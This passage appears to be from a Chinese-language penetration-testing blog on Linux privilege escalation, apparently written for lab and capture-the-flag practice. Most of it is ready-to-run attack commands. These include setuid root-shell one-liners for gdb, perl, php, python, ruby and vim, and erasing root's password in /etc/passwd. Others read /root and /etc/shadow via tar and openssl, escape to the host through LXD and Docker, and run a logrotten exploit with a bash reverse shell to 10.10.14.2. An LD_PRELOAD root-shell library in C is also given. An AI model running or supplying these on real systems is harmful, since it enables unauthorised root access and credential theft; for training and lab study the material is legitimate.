+<h4 id="利用功能"><a href="#利用功能" class="headerlink" title="利用功能"></a>利用功能</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">getcap /usr/bin/vim.basic</span><br><span class="line"></span><br><span class="line">/usr/bin/vim.basic cap_dac_override=eip</span><br></pre></td></tr></table></figure>
+<p>例如， <code>/usr/bin/vim.basic</code> 二进制文件在没有特殊权限的情况下运行，例如使用 <code>sudo</code> 。但是，因为该二进制文件设置了 <code>cap_dac_override</code> 功能，它可以提升运行它的用户的权限。这将允许渗透测试人员获得 <code>cap_dac_override</code> 功能并执行需要此功能的任务。</p>
+<p>我们也可以在非交互模式下进行这些更改：</p>
+<h4 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a>gdb</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb -nx -ex <span class="string">&#x27;python import os; os.setuid(0)&#x27;</span> -ex <span class="string">&#x27;!sh&#x27;</span> -ex quit</span><br></pre></td></tr></table></figure>
+<h4 id="perl"><a href="#perl" class="headerlink" title="perl"></a>perl</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e <span class="string">&#x27;use POSIX qw(setuid); POSIX::setuid(0); exec &quot;/bin/sh&quot;;&#x27;</span></span><br></pre></td></tr></table></figure>
+<h4 id="php"><a href="#php" class="headerlink" title="php"></a>php</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">&quot;posix_setuid(0); system(&#x27;/bin/sh&#x27;);&quot;</span></span><br></pre></td></tr></table></figure>
+<h4 id="python"><a href="#python" class="headerlink" title="python"></a>python</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import os; os.setuid(0); os.system(&quot;/bin/sh&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
+<h4 id="ruby"><a href="#ruby" class="headerlink" title="ruby"></a>ruby</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -e <span class="string">&#x27;Process::Sys.setuid(0); exec &quot;/bin/sh&quot;&#x27;</span></span><br></pre></td></tr></table></figure>
+<h4 id="rvim-vim等编辑器"><a href="#rvim-vim等编辑器" class="headerlink" title="rvim/vim等编辑器"></a>rvim/vim等编辑器</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rvim -c <span class="string">&#x27;:py import os; os.setuid(0); os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-c&quot;, &quot;reset; exec sh&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim -c <span class="string">&#x27;:py import os; os.setuid(0); os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-c&quot;, &quot;reset; exec sh&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>也可以：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -e &#x27;:%s/^root:[^:]*:/root::/\nwq!&#x27; | /usr/bin/vim.basic -es /etc/passwd</span><br></pre></td></tr></table></figure><br>可以看到那行中的 <code>x</code> 已经消失了，这意味着我们可以使用 <code>su</code> 命令以 root 身份登录而不需要输入密码。</p>
+<h4 id="tar"><a href="#tar" class="headerlink" title="tar"></a>tar</h4><ol>
+<li>tar权限</li>
+</ol>
+<ul>
+<li><p>```sh<br>  norris@sirrom:~$ /sbin/getcap -r / 2&gt;/dev/null<br>  /usr/bin/tar = cap_dac_read_search+ep</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">    </span><br><span class="line">    - cap_dac_read_search可以绕过文件的读权限检查以及目录的读/执行权限的检查，利用此特性我们可以读取系统中的敏感信息。</span><br><span class="line">- 绕过权限检查即可成功创建压缩文件</span><br><span class="line">    </span><br><span class="line">- ```sh</span><br><span class="line">    norris@sirrom:~$ tar -vcf root.tar /root</span><br><span class="line">    tar: Removing leading `/&#x27; from member names</span><br><span class="line">    /root/</span><br><span class="line">    /root/root.txt</span><br><span class="line">    /root/.bashrc</span><br><span class="line">    /root/.gnupg/</span><br><span class="line">    /root/.gnupg/private-keys-v1.d/</span><br><span class="line">    /root/.bash_history</span><br><span class="line">    /root/.cache/</span><br><span class="line">    /root/.local/</span><br><span class="line">    /root/.local/share/</span><br><span class="line">    /root/.local/share/nano/</span><br><span class="line">    /root/.profile</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>解压缩</p>
+</li>
+<li><p>```sh<br>  norris@sirrom:~$ ls -la root.tar<br>  -rw-r—r— 1 norris norris 10240 Mar 19 08:44 root.tar<br>  norris@sirrom:~$ tar -xf root.tar<br>  norris@sirrom:~$ ls -la /root<br>  total 36<br>  drwx——— 5 norris norris 4096 Oct 11  2019 .<br>  drwxr-xr-x 6 norris norris 4096 Mar 19 08:45 ..<br>  -r———— 1 norris norris  672 Oct 11  2019 .bash_history<br>  -rw-r—r— 1 norris norris  570 Jan 31  2010 .bashrc<br>  drwx——— 2 norris norris 4096 Oct 11  2019 .cache<br>  drwx——— 3 norris norris 4096 Oct 11  2019 .gnupg<br>  drwxr-xr-x 3 norris norris 4096 Oct 11  2019 .local<br>  -rw-r—r— 1 norris norris  148 Aug 17  2015 .profile<br>  -rw———- 1 norris norris   33 Oct 11  2019 root.txt</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">    </span><br><span class="line">- 读取root.txt文件</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">1. ```sh</span><br><span class="line">    norris@sirrom:~$ cat /root/root.txt </span><br><span class="line">    8fc9376d961670ca10be270d52eda423</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h4 id="openssl"><a href="#openssl" class="headerlink" title="openssl"></a>openssl</h4><p>使用openssl读取<code>/etc/shadow</code>文件。</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">setcap</span> =ep /usr/bin/openssl</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用openssl生成证书</span></span><br><span class="line">┌──(kali㉿kali)-[/]</span><br><span class="line">└─$ openssl req -x509 -newkey rsa:2048 -keyout /tmp/key.pem -out /tmp/cert.pem -days 365 -nodes</span><br><span class="line"></span><br><span class="line"><span class="comment"># 进入系统根目录下</span></span><br><span class="line">┌──(kali㉿kali)-[/]</span><br><span class="line">└─$ <span class="built_in">cd</span> /</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动web服务器，监听8080端口</span></span><br><span class="line">┌──(kali㉿kali)-[/]</span><br><span class="line">└─$ openssl s_server -key /tmp/key.pem -cert /tmp/cert.pem -port 8080 -HTTP</span><br><span class="line"></span><br><span class="line"><span class="comment"># 访问本机的web服务，读取/etc/shadow文件</span></span><br><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ curl --http0.9 -k <span class="string">&quot;https://127.0.0.1:8080/etc/shadow&quot;</span></span><br><span class="line">root:!:18681:0:99999:7:::</span><br><span class="line">daemon:*:18681:0:99999:7:::</span><br><span class="line">bin:*:18681:0:99999:7:::</span><br><span class="line">sys:*:18681:0:99999:7:::</span><br><span class="line"><span class="built_in">sync</span>:*:18681:0:99999:7:::</span><br></pre></td></tr></table></figure>
+<h1 id="服务提权"><a href="#服务提权" class="headerlink" title="服务提权"></a>服务提权</h1><h2 id="Cron滥用"><a href="#Cron滥用" class="headerlink" title="Cron滥用"></a><code>Cron</code>滥用</h2><p>Cron 作业也可以设置为运行一次（例如在启动时）。它们通常用于运行备份、清理目录等管理任务。 <code>crontab</code> 命令可以创建一个 cron 文件，该文件将在指定的计划由 cron 守护进程运行。当创建时，cron 文件将创建在 <code>/var/spool/cron</code> 为创建它的特定用户。crontab 文件中的每个条目需要以下顺序的六项：分钟、小时、天、月、星期、命令。例如， <code>0 */12 * * * /home/admin/backup.sh</code> 条目将每 12 小时运行一次。</p>
+<p>根 crontab 几乎总是只能由 root 用户或具有完全 sudo 特权的用户编辑；然而，它仍然可能被滥用。你可能会找到一个作为 root 运行的可写脚本，即使你无法读取 crontab 来知道确切的计划，你也可能能够确定它运行的频率（例如，每小时创建一个 <code>.tar.gz</code> 文件的备份脚本）。在这种情况下，你可以在脚本末尾追加一个命令（例如一个反向 shell 的单行命令），它将在下一次 cron 作业运行时执行。</p>
+<p>某些应用程序会在 <code>/etc/cron.d</code> 目录中创建 cron 文件，并且可能配置错误，允许非 root 用户编辑它们。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -path /proc -prune -o -type f -perm -o+w 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+<p>在 <code>/dmz-backups</code> 目录中快速查看显示似乎每三分钟创建的文件。这似乎是一个严重的配置错误。也许系统管理员打算指定每三小时像 <code>0 */3 * * *</code> 一样，但错误地写成了 <code>*/3 * * * *</code> ，这告诉 cron 作业每三分钟运行。第二个问题是 <code>backup.sh</code> 的 shell 脚本是全局可写的，并以 root 身份运行。</p>
+<p>我们可以使用 pspy 这个命令行工具来确认 cron 作业是否正在运行，该工具用于查看正在运行的进程，而无需 root 权限。我们可以用它来查看其他用户运行的命令、cron 作业等。它的工作原理是通过扫描 procfs。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./pspy64 -pf -i 1000</span><br></pre></td></tr></table></figure>
+<h3 id="incron提权"><a href="#incron提权" class="headerlink" title="incron提权"></a><code>incron</code>提权</h3><p>算是cron的分支，只不过cron算是基于时间的自启动规则，而incron则是基于文件事件的自启动规则</p>
+<p><code>incron</code> 则是根据文件系统事件执行命令，例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">某个文件被写入</span><br><span class="line">某个目录中新建文件</span><br><span class="line">某个文件权限被修改</span><br><span class="line">某个文件被删除</span><br><span class="line">某个文件被关闭</span><br></pre></td></tr></table></figure>
+<h4 id="incron-的核心组成"><a href="#incron-的核心组成" class="headerlink" title="incron 的核心组成"></a>incron 的核心组成</h4><p>incron 通常由这几部分组成：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">incrond        守护进程，负责监听文件事件并执行命令</span><br><span class="line">incrontab      用户管理 incron 规则的命令</span><br><span class="line">/etc/incron.d/ 系统级 incron 规则目录</span><br><span class="line">/var/spool/incron/ 用户级 incron 规则目录</span><br></pre></td></tr></table></figure>
+<p>常见配置位置：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/etc/incron.d/*</span><br><span class="line">/var/spool/incron/*</span><br><span class="line">/etc/incron.allow</span><br><span class="line">/etc/incron.deny</span><br></pre></td></tr></table></figure>
+<p>可以通过<code>cat /etc/incron.d/*</code>来检查是否存在可攻击面</p>
+<h2 id="容器提权"><a href="#容器提权" class="headerlink" title="容器提权"></a>容器提权</h2><h3 id="LXC概述"><a href="#LXC概述" class="headerlink" title="LXC概述"></a>LXC概述</h3><p>Linux 容器（ <code>LXC</code> ）是一种操作系统级虚拟化技术，它允许多个 Linux 系统在单个主机上隔离运行，每个容器拥有自己的进程，但共享主机系统内核。</p>
+<p>LXC 由于其易用性而非常受欢迎，并已成为 IT 安全的重要组成部分。</p>
+<p>默认情况下， <code>LXC</code> 比虚拟机消耗更少的资源，并具有标准接口，便于同时管理多个容器。具有 <code>LXC</code> 的平台甚至可以跨多个云进行组织，提供可移植性，并确保在开发者系统上正常运行的应用程序可以在任何其他系统上运行。此外，大型应用程序可以通过 Linux 容器接口启动、停止或更改其环境变量。</p>
+<h4 id="LXD"><a href="#LXD" class="headerlink" title="LXD"></a>LXD</h4><p>Linux 守护进程（LXD）在某些方面狠相似，但是它设计了一个用于包含完整的操作系统。因此它不是一个应用容器而是一个系统容器。在我们可以使用此服务提升权限之前，我们必须属于 <code>lxc</code> 或 <code>lxd</code> 组。我们可以使用以下命令来确认这一点：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id</span><br></pre></td></tr></table></figure>
+<p>从现在开始，我们可以通过几种方式来利用 <code>LXC</code> / <code>LXD</code> 。我们可以创建自己的容器并将其传输到目标系统，或者使用现有的容器。不幸的是，管理员经常使用安全性很低甚至没有安全性的模板。这种态度的结果是，我们已经有了可以用来对付我们自己系统的工具。</p>
+<p>这些模板通常没有密码，特别是如果它们是简单的测试环境。这些应该可以快速访问并且易于使用。对安全的关注会使整个过程变得复杂，使其更难，从而大大减慢速度。如果我们运气好，系统上有一个这样的容器，它就可以被利用。为此，我们需要将这个容器作为图像导入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lxc image import ubuntu-template.tar.xz --alias ubuntutemp</span><br><span class="line">lxc image list</span><br></pre></td></tr></table></figure>
+<p>在确认此图像已成功导入后，我们可以通过指定 <code>security.privileged</code> 标志和容器的根路径来启动并配置图像。此标志禁用所有允许我们操作主机的隔离功能。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lxc init ubuntutemp privesc -c security.privileged=true</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true</span><br></pre></td></tr></table></figure>
+<p>完成这些操作后，我们可以启动容器并登录到其中。在容器中，我们可以进入我们指定的路径，以 <code>root</code> 的方式访问主机系统的 <code>resource</code> 。<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lxc start privesc</span><br></pre></td></tr></table></figure><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lxc exec privesc /bin/bash</span><br></pre></td></tr></table></figure></p>
+<h4 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h4><h5 id="docker共享目录"><a href="#docker共享目录" class="headerlink" title="docker共享目录"></a>docker共享目录</h5><p>使用 Docker 时，共享目录（卷挂载）可以在主机系统和容器文件系统之间建立桥梁。通过共享目录，主机系统上的特定目录或文件可以被容器访问。这对于持久化数据、共享代码以及促进开发环境和 Docker 容器之间的协作非常有用。然而，这始终取决于环境的设置和管理员想要实现的目标。要创建共享目录，需要指定主机系统上的一个路径和容器内部的一个对应路径，从而在这两个位置之间建立直接链接。</p>
+<p>共享目录提供了几个优势，包括能够在容器生命周期之外持久化数据、简化代码共享和开发，以及促进团队协作。需要注意的是，共享目录可以根据特定的管理员要求以只读或读写方式挂载。当以只读方式挂载时，容器内的修改不会影响主机系统，这在优先考虑只读访问以防止意外修改时非常有用。</p>
+<p>我们可以使用 <code>docker</code> 二进制文件与套接字交互，并创建自己的 Docker 容器，将主机根目录（ <code>/</code> ）映射到容器上的 <code>/hostsystem</code> 目录。有了这个设置，我们就能获得对主机系统的完全访问权限。因此，我们必须正确映射这些目录，并使用 <code>main_app</code> Docker 镜像。<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/tmp/docker -H unix:///app/docker.sock ps</span><br></pre></td></tr></table></figure>
+<p>现在，我们可以使用登录到新的特权 Docker 容器，并导航到 <code>/hostsystem</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/tmp/docker -H unix:///app/docker.sock exec -it 7ae3bcc818af /bin/bash</span><br></pre></td></tr></table></figure>
+<h5 id="Docker套接字"><a href="#Docker套接字" class="headerlink" title="Docker套接字"></a>Docker套接字</h5><p>一种也可能发生的情况是 Docker 套接字可写。通常，这个套接字位于 <code>/var/run/docker.sock</code> 。然而，位置可能理解上有所不同。因为基本上，这只能由 root 或 docker 组写入。如果我们作为用户，不属于这两个组之一，并且 Docker 套接字仍然具有可写的权限，那么我们仍然可以使用这种情况来提升我们的权限。<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash</span><br></pre></td></tr></table></figure></p>
+<h4 id="K8s"><a href="#K8s" class="headerlink" title="K8s"></a>K8s</h4><p>Kubernetes，也被称为 <code>K8s</code> ，是一项具有革命性影响的技术，对软件开发领域产生了重大影响。该平台彻底改变了应用程序的部署和管理流程，提供了一种更高效、更流畅的方法。Kubernetes 采用开源架构，专门设计用于促进应用程序容器的更快、更简单的部署、扩展和管理。</p>
+<p>由 Google 开发，Kubernetes 利用超过十年的运行复杂工作负载的经验。因此，它已成为 DevOps 宇宙中微服务编排的关键工具。自创建以来，Kubernetes 已捐赠给云原生计算基金会，在那里它已成为行业的黄金标准。理解 K8s 容器的安全方面至关重要。在渗透测试期间，我们可能会访问其中一个容器。</p>
+<p>Kubernetes 的一个关键特性是其适应性和与各种环境的兼容性。该平台提供了广泛的功能，使开发人员和系统管理员能够轻松配置、自动化和扩展他们的部署和应用程序。因此，Kubernetes 已成为希望简化开发流程和提高效率的组织的首选解决方案。</p>
+<h2 id="Logrotate"><a href="#Logrotate" class="headerlink" title="Logrotate"></a>Logrotate</h2><p>每个 Linux 系统都会产生大量的日志文件。为了防止硬盘溢出，一个名为 <code>logrotate</code> 的工具负责归档或处理旧的日志。如果不对日志文件加以关注，它们会越来越大，最终占用所有可用的磁盘空间。此外，搜索大量日志文件非常耗时。为了防止这种情况并节省磁盘空间， <code>logrotate</code> 应运而生。 <code>/var/log</code> 中的日志为管理员提供了他们需要的信息，以确定故障背后的原因。几乎同样重要的是那些未被注意的系统细节，例如所有服务是否正常运行。</p>
+<p><code>Logrotate</code> 提供了许多管理这些日志文件的功能。这些功能包括：</p>
+<ul>
+<li>指定日志文件的 <code>size</code> 。</li>
+<li>它的 <code>age</code> ，</li>
+<li>以及当其中一个因素达到时需要采取的 action 措施。</li>
+</ul>
+<p>轮换本身的功能在于重命名日志文件。例如，可以为每天的新日志文件创建新的文件，而旧的文件将自动重命名。另一个例子是清空最旧的日志文件，从而减少内存消耗。</p>
+<p>这个工具通常通过 <code>cron</code> 定期启动，并通过配置文件 <code>/etc/logrotate.conf</code> 进行控制。在这个文件中，它包含了决定 <code>logrotate</code> 功能的全局设置。</p>
+<p>如果满足要求，我们可以使用一个现成的漏洞利用程序来执行此操作。该漏洞利用程序名为 logrotten（<a target="_blank" rel="noopener" href="https://github.com/whotwagner/logrotten）。我们可以在目标系统的类似内核上下载并编译它，然后将其传输到目标系统。或者，如果我们可以在目标系统上编译代码，我们也可以直接在目标系统上执行。">https://github.com/whotwagner/logrotten）。我们可以在目标系统的类似内核上下载并编译它，然后将其传输到目标系统。或者，如果我们可以在目标系统上编译代码，我们也可以直接在目标系统上执行。</a></p>
+<p>接下来，我们需要一个要执行的载荷。这里有许多不同的选项可供我们使用。在这个例子中，我们将使用我们用来攻击目标系统的虚拟机的 <code>IP</code> 和 <code>port</code> 来运行一个简单的基于 bash 的反向 shell。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;bash -i &gt;&amp; /dev/tcp/10.10.14.2/9001 0&gt;&amp;1&#x27; &gt; payload</span><br></pre></td></tr></table></figure>
+<p>在运行漏洞利用程序之前，我们需要确定 <code>logrotate</code> 在 <code>logrotate.conf</code> 中使用的是哪个选项。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep &quot;create\|compress&quot; /etc/logrotate.conf | grep -v &quot;#&quot;</span><br></pre></td></tr></table></figure>
+<p>如果是<code>create</code>，即可利用<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./logrotten -p ./payload /tmp/tmp.log</span><br></pre></td></tr></table></figure></p>
+<p>记得起一个nc连接</p>
+<h1 id="内核漏洞"><a href="#内核漏洞" class="headerlink" title="内核漏洞"></a>内核漏洞</h1><h2 id="CVE"><a href="#CVE" class="headerlink" title="CVE"></a>CVE</h2><p>先检查内核级别和 Linux 操作系统版本。<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/lsb-release </span><br></pre></td></tr></table></figure>
+<p>通过 Google 搜索 可以找到漏洞的 PoC。接下来使用 <code>wget</code> 或其他文件传输方法将其下载到系统上。我们可以使用 gcc 编译漏洞代码，并使用 <code>chmod +x</code> 设置可执行位。</p>
+<h3 id="Dirty-Pipe"><a href="#Dirty-Pipe" class="headerlink" title="Dirty Pipe"></a>Dirty Pipe</h3><p>Linux 内核中的一个漏洞，名为 Dirty Pipe（CVE-2022-0847），允许未经授权地写入 Linux 上的 root 用户文件。从技术角度来看，该漏洞与 2016 年发现的 Dirty Cow 漏洞相似。从版本 <code>5.8</code> 到 <code>5.17</code> 的所有内核都受到影响并易受此漏洞攻击。</p>
+<p>简单来说，这个漏洞允许用户写入任意文件，只要他对这些文件有读取权限。值得注意的是，Android 手机也受到影响。Android 应用以用户权限运行，因此一个恶意或被攻陷的应用程序可能接管手机。</p>
+<p>此漏洞基于管道。管道是进程间单向通信的机制，在 Unix 系统上尤其流行。例如，我们可以编辑 <code>/etc/passwd</code> 文件并移除 root 的密码提示。这将允许我们使用 <code>su</code> 命令登录而不需要密码提示。</p>
+<h2 id="共享库"><a href="#共享库" class="headerlink" title="共享库"></a>共享库</h2><p>Linux 程序通常使用动态链接共享对象库。库包含编译代码或其他数据，开发者使用它们以避免在多个程序中重复编写相同的代码片段。Linux 中有两种类型的库： <code>static libraries</code> （以.a 文件扩展名表示）和 <code>dynamically linked shared object libraries</code> （以.so 文件扩展名表示）。当程序被编译时，静态库成为程序的一部分，并且不能被修改。然而，动态库可以被修改以控制调用它们的程序的执行。</p>
+<p>指定动态库位置有多种方法，这样系统在程序执行时就知道去哪里查找它们。这包括编译程序时的 <code>-rpath</code> 或 <code>-rpath-link</code> 标志，使用环境变量 <code>LD_RUN_PATH</code> 或 <code>LD_LIBRARY_PATH</code> ，将库放在 <code>/lib</code> 或 <code>/usr/lib</code> 默认目录，或在 <code>/etc/ld.so.conf</code> 配置文件中指定包含库的另一个目录。</p>
+<p>此外， <code>LD_PRELOAD</code> 环境变量可以在执行二进制文件之前加载库。来自该库的函数优先于默认函数。可以使用 <code>ldd</code> 工具查看二进制文件所需的共享对象。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ldd /bin/ls</span><br><span class="line"></span><br><span class="line">    linux-vdso.so.1 =&gt;  (0x00007fff03bc7000)</span><br><span class="line">    libselinux.so.1 =&gt; /lib/x86_64-linux-gnu/libselinux.so.1 (0x00007f4186288000)</span><br><span class="line">    libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f4185ebe000)</span><br><span class="line">    libpcre.so.3 =&gt; /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007f4185c4e000)</span><br><span class="line">    libdl.so.2 =&gt; /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f4185a4a000)</span><br><span class="line">    /lib64/ld-linux-x86-64.so.2 (0x00007f41864aa000)</span><br><span class="line">    libpthread.so.0 =&gt; /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007f418582d000)</span><br></pre></td></tr></table></figure>
+<h3 id="LD-PRELOAD-权限提升"><a href="#LD-PRELOAD-权限提升" class="headerlink" title="LD_PRELOAD 权限提升"></a>LD_PRELOAD 权限提升</h3><p>使用<code>sudo -l</code>查看<br>如果存在<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">env_keep += LD_PRELOAD</span><br></pre></td></tr></table></figure><br>可尝试利用</p>
+<p>让我们看看如何利用 LD_PRELOAD 环境变量来提升权限。为此，我们需要一个具有 <code>sudo</code> 权限的用户。<br>我们可以利用 <code>LD_PRELOAD</code> 的问题来运行自定义共享库文件。让我们编译以下库：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">void _init() &#123;</span><br><span class="line">unsetenv(&quot;LD_PRELOAD&quot;);</span><br><span class="line">setgid(0);</span><br><span class="line">setuid(0);</span><br><span class="line">system(&quot;/bin/bash&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>我们可以按以下方式编译：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fPIC -shared -o root.so root.c -nostartfiles</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart</span><br></pre></td></tr></table></figure>
+<h3 id="共享对象劫持"><a href="#共享对象劫持" class="headerlink" title="共享对象劫持"></a>共享对象劫持</h3><p>开发中的程序和二进制文件通常都有与之关联的自定义库</p>
+<p>我们可以使用 ldd 来打印二进制文件或共享对象所需的共享对象。 <code>Ldd</code> 显示每个程序依赖项的对象位置以及它们加载到内存中的十六进制地址。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ldd payroll</span><br><span class="line"></span><br><span class="line">linux-vdso.so.1 =&gt;  (0x00007ffcb3133000)</span><br><span class="line">libshared.so =&gt; /development/libshared.so (0x00007f0c13112000)</span><br><span class="line">libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f7f62876000)</span><br><span class="line">/lib64/ld-linux-x86-64.so.2 (0x00007f7f62c40000)</span><br></pre></td></tr></table></figure>
+<p>查看<code>/development</code>发现可写可尝试利用</p>
+<p>我们看到一个名为 <code>libshared.so</code> 的非标准库被列为该二进制文件的依赖项。如前所述，可以从自定义位置加载共享库。其中一种设置是 <code>RUNPATH</code> 配置。此文件夹中的库优先于其他文件夹。这可以使用 readelf 实用程序进行检查。<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readelf -d payroll  | grep PATH</span><br></pre></td></tr></table></figure></p>
